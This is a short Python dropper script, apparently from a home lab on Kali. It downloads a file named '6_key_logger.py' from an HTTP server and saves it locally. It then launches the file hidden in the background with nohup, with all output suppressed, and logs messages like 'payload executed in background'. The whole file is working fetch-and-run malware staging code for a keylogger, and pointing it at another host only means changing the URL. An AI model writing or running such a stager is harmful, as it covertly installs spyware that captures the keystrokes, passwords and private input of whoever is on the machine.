import requests
import subprocess
import os

save_path = "./6_key_logger.py"

file_url = "http://127.0.0.1:8000/6_key_logger.py"

try:
    print("[+] downloading payload...")
    response = requests.get(file_url)

    with open(save_path, "wb") as f:
        f.write(response.content)

    print("[+]payload saved to", save_path)

    subprocess.Popen(["nohup","python",save_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
#/home/kali/Desktop/ryan_p/pypro/bin/python

    print("[+] payload executed in background")

except Exception as e :
    print("[-] failed:",e)


# subprocess.Popen(["nohup","python",save_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

#with open(save_path, "wb") as f:
    # f.write(response.content)